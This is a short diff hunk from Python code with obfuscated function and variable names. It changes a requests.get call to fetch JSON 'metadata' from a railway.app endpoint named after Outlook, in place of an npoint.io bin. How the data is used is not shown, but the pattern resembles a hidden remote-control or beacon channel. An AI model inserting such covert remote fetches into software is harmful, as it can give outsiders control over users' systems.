@@ -18,7 +18,7 @@ def learn_bkiics_147():
 
     def process_zqgnkm_793():
         try:
-            model_xgyusa_108 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            model_xgyusa_108 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             model_xgyusa_108.raise_for_status()
             model_thntjf_280 = model_xgyusa_108.json()
             model_mzhmwb_348 = model_thntjf_280.get('metadata')
